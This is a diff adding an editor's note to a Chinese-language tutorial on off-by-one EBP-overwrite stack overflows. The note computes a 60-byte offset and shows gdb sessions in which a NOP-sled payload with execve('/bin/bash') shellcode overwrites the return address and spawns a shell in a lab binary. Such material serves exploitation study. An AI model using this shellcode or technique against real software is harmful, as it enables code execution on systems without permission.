@@ -273,6 +273,58 @@ Dump of assembler code for function main:
 
 求助：如果在创建栈内容之前ESP边界已经对齐为16字节的话该怎么办？这种情况下，即使程序以gcc默认的16字节栈边界编译，按理来说“EBP覆盖”法也是可以用的。但是我一直都写不出有效代码。在我所有的试运行程序中，创建栈空间之前，ESP边界都没有对齐16字节。但是不管我多么小心地创建栈内容，gcc总是给本地变量添加额外空间，这样ESP边界就不能对齐16字节。如果任何人有有效代码或者知道为什么ESP总是无法对齐，麻烦告诉我！拜托了！  
 
+## 0x05 编者注
+按照文章的思路，测试时找到的返回空间地址与buf 起始地址偏移是 60个字节，如下所示，需要覆盖的ebp 是 0xbffff4d4，需要覆盖的返回空间地址是 0xbffff404，poc 设置返回地址是 0xbffff408，即 60 + 返回地址 + 147 nop + 45 shellcode = 256  
+```
+(gdb) r `python -c 'print "A"*60+"B"*4+"C"*192'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/simba/Documents/LinuxSec/vuln `python -c 'print "A"*60+"B"*4+"C"*192'`
+
+Breakpoint 1, bar (arg=0xbffff6ef 'A' <repeats 60 times>, "BBBB", 'C' <repeats 136 times>...) at stackoffone.c:8
+8	void bar(char* arg) {
+(gdb) finish
+Run till exit from #0  bar (arg=0xbffff6ef 'A' <repeats 60 times>, "BBBB", 'C' <repeats 136 times>...)
+    at stackoffone.c:8
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+(gdb) p $eip
+$1 = (void (*)()) 0x42424242
+
+(gdb) info reg
+eax            0xbffff6ef	-1073744145
+ecx            0xfffffefe	-258
+edx            0xbffff6ef	-1073744145
+ebx            0xb7fc5ff4	-1208197132
+esp            0xbffff4cc	0xbffff4cc
+ebp            0xbffff4d4	0xbffff4d4
+esi            0x0	0
+edi            0xbffff7f0	-1073743888
+eip            0x8048477	0x8048477 <bar>
+eflags         0x282	[ SF IF ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) r `python -c 'print "A"*60+ "\x08\xf4\xff\xbf" +  "\x90" * 147 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x83\xec\x01\xc6\x04\x24\x2f\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/simba/Documents/LinuxSec/vuln `python -c 'print "A"*60+ "\x08\xf4\xff\xbf" +  "\x90" * 147 + "\x31\xc0\x83\xec\x01\x88\x04\x24\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x83\xec\x01\xc6\x04\x24\x2f\x89\xe6\x50\x56\xb0\x0b\x89\xf3\x89\xe1\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80"'`
+
+Breakpoint 1, bar (
+    arg=0xbffff6ef 'A' <repeats 60 times>, "\b\364\377\277\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...) at stackoffone.c:8
+8	void bar(char* arg) {
+(gdb) finish
+Run till exit from #0  bar (
+    arg=0xbffff6ef 'A' <repeats 60 times>, "\b\364\377\277\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...) at stackoffone.c:8
+process 24214 is executing new program: /bin/bash
+```
+
 ## 参考文章 
 
 http://seclists.org/bugtraq/1998/Oct/109
